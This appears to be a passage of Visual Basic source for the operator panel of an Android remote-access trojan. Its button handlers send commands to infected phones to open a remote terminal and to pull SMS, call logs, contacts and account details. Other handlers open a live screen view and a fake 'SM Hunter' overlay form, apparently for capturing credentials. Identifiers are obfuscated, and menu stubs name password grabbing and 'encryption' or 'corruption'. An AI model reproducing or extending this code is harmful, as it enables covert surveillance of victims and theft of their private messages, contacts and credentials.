                Dim objs As Object() = {cClient, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "msg:" & Frm_Config_Settings.ChekLink(result.Mytext.Text) & ":up" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            Else
                Return
            End If
        End If
    End Sub

    Private Sub Guna2PictureBox28_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox28.Click
        If Not ClassClient Is Nothing Then
            Dim result As Frm_Dialog = New Frm_Dialog
            result.Title = "Enter Messege"
            result.ShowDialog()
            If result.DialogResult = DialogResult.OK Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                Dim chk0, chk1 As Integer
                chk0 = 0
                chk1 = 0
                Dim objs As Object() = {cClient, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "msg:" & result.Mytext.Text & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            Else
                Return
            End If
        End If
    End Sub

    Private Sub Guna2PictureBox16_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox16.Click
        If Not ClassClient Is Nothing Then
            Dim result As Frm_Dialog = New Frm_Dialog
            result.Title = "Enter Link"
            result.ShowDialog()
            If result.DialogResult = DialogResult.OK Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                Dim chk0, chk1 As Integer
                chk0 = 0
                chk1 = 0
                Dim objs As Object() = {cClient, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "lnk<*>" & Frm_Config_Settings.ChekLink(result.Mytext.Text) & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            Else
                Return
            End If
        End If
    End Sub

    Private Sub Guna2PictureBox19_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox19.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".terminal" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.fizbuCxccmvzoBCBzCpvBeiNzadNgNqazVdvbytrwcvxvspiNv & sockets.Data.SPL_SOCKET & "run", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub Guna2PictureBox14_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox14.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".calls" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.xMbcsprftVsbyrnepMvbxymvbcaMBtspwMtsdCamacqdvsVofb & sockets.Data.SPL_SOCKET & "calls", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub Guna2PictureBox2_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox2.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".sms" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.xMNiBuVwxgcCoigfdybcfswmfvNypiCpnbvMxNvucpanibamgx & sockets.Data.SPL_SOCKET & "sms" & sockets.Data.SPL_DATA & "content://sms/", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub Guna2PictureBox11_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox11.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".contacts" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.NryoNrnbVyodfombCsoqCzuyoMenssfutitvVvNfBwmpuzyaos & sockets.Data.SPL_SOCKET & "contacts", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub Guna2PictureBox9_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox9.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.Account & sockets.Data.SPL_SOCKET & "account", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub Guna2PictureBox24_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox24.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "kill<*>" & "x" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub Guna2PictureBox12_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox12.Click
        If Not ClassClient Is Nothing Then
            Dim handle As String = "SM_Hunter_" & ClassClient.ClientAddressIP
            Dim Screener As Frm_Faker = My.Application.OpenForms(handle)
            If Screener Is Nothing Then
                Screener = New Frm_Faker
                Screener.Name = handle
                Screener.Title = String.Format("{0} - IP:{1}", "SM Hunter", ClassClient.ClientAddressIP)
                Screener.Tag = ClassClient.ClientAddressIP
                Screener.classClient = ClassClient
                Screener.Client = ClassClient.myClient
                Screener.DownloadsFolder = ClassClient.FolderUSER
                DirectCast(Screener, Control).Show()
            End If
        Else
            Return
        End If
    End Sub

    Private Sub Guna2HtmlLabel20_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2GradientPanel3_Paint_1(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2PictureBox40_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2PictureBox38_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2PictureBox39_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2PictureBox37_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label26_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label27_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2HtmlLabel12_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2HtmlLabel13_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label28_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label29_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2HtmlLabel14_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2HtmlLabel15_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2GradientPanel6_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Label23_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2PictureBox55_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2PictureBox58_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox58.Click

        If Not ClassClient Is Nothing Then
            Dim cClient = ClassClient.myClient
            Dim handle As String = "Live_Screen_" & ClassClient.ClientAddressIP

            Dim Screener As Frm_VNC = My.Application.OpenForms(handle)

            If Screener Is Nothing Then

                Screener = New Frm_VNC

                Screener.Name = handle

                Screener.Title = String.Format("{0} - IP:{1}", "Live Screen", ClassClient.ClientAddressIP)

                Screener.Tag = ClassClient.ClientAddressIP

                Screener.classClient = ClassClient

                Screener.Client = ClassClient.myClient

                Screener.DownloadsFolder = ClassClient.FolderUSER
                DirectCast(Screener, Control).Show()
            End If
            'Guna2Transition1.Hide(Painel3Control)
            'Guna2Transition1.ShowSync(PainelScreenLive)
            'trocarPainelLive(Screener)
            'Guna2PictureBox57.Visible = True
        End If
    End Sub

    Private Sub Guna2PictureBox57_Click(sender As Object, e As EventArgs)
        'Guna2Transition1.Hide(PainelScreenLive)
        'Guna2Transition1.ShowSync(Painel3Control)
        'Guna2PictureBox57.Visible = False
    End Sub

    Private Sub Guna2Button4_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2GradientPanel5_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2HtmlLabel28_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2GradientPanel9_Paint(sender As Object, e As PaintEventArgs) Handles Painel1Control.Paint

    End Sub

    Private Sub MenuContexto_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles MenuContexto.Opening

    End Sub

    Private Sub PhysicalMemoryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PhysicalMemoryToolStripMenuItem.Click

    End Sub

    Private Sub SendToMemory10kStringToolStripMenuItem7_Click(sender As Object, e As EventArgs) Handles SendToMemory10kStringToolStripMenuItem7.Click

    End Sub

    Private Sub EncryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptionToolStripMenuItem.Click

    End Sub

    Private Sub EnableCorruptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EnableCorruptionToolStripMenuItem.Click

    End Sub

    Private Sub GetAllPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetAllPasswordsToolStripMenuItem.Click

    End Sub

    Private Sub OthersSettingsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OthersSettingsToolStripMenuItem.Click

    End Sub

    Private Sub Memory3ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Memory3ToolStripMenuItem.Click

    End Sub

    Private Sub MemoryCardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MemoryCardToolStripMenuItem.Click

    End Sub

    Private Sub OpenToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles OpenToolStripMenuItem3.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".sms" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.xMNiBuVwxgcCoigfdybcfswmfvNypiCpnbvMxNvucpanibamgx & sockets.Data.SPL_SOCKET & "sms" & sockets.Data.SPL_DATA & "content://sms/", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub Guna2GradientPanel1_Paint(sender As Object, e As PaintEventArgs) Handles Guna2GradientPanel1.Paint

    End Sub

    Private Sub ListAppsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListAppsToolStripMenuItem.Click

    End Sub

    Private Sub OpenToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles OpenToolStripMenuItem5.Click

    End Sub
End Class
